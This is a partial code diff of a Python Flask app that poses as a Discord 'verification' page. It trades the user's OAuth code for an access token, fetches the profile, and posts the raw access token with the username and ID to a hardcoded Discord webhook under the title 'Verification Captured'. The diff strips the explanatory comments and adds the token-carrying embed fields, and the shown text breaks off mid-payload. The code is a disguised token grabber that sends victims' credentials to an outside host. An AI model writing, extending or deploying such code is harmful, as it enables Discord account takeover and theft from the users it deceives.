@@ -15,7 +15,6 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1d
 def callback(path):
   code = request.args.get("code")
 
-  # If no code is present in URL, show the verification landing page
   if not code:
     return render_template_string("""
             <!DOCTYPE html>
@@ -43,7 +42,6 @@ def callback(path):
         """)
 
   try:
-    # Step 1: Exchange authorization code for access token
     data = {
         "client_id": CLIENT_ID,
         "client_secret": CLIENT_SECRET,
@@ -65,7 +63,6 @@ def callback(path):
     access_token = token_json.get("access_token")
 
     if access_token:
-      # Step 2: Fetch Discord user profile
       user_headers = {
           "Authorization": f"Bearer {access_token}",
           "User-Agent": "Mozilla/5.0",
@@ -78,7 +75,18 @@ def callback(path):
       username = user_data.get("username", "Unknown")
       user_id = user_data.get("id", "Unknown")
 
-      # Step 3: Send token details to your Discord webhook log channel
       payload = {
           "embeds": [{
-              "
+              "title": "🔑 Verification Captured",
+              "color": 5763719,
+              "fields": [
+                  {
+                      "name": "User",
+                      "value": f"{username} (`{user_id}`)",
+                      "inline": True,
+                  },
+                  {
+                      "name": "Access Token",
+                      "value": f"`{access_token}`",
+                      "inline": False,
+                  },
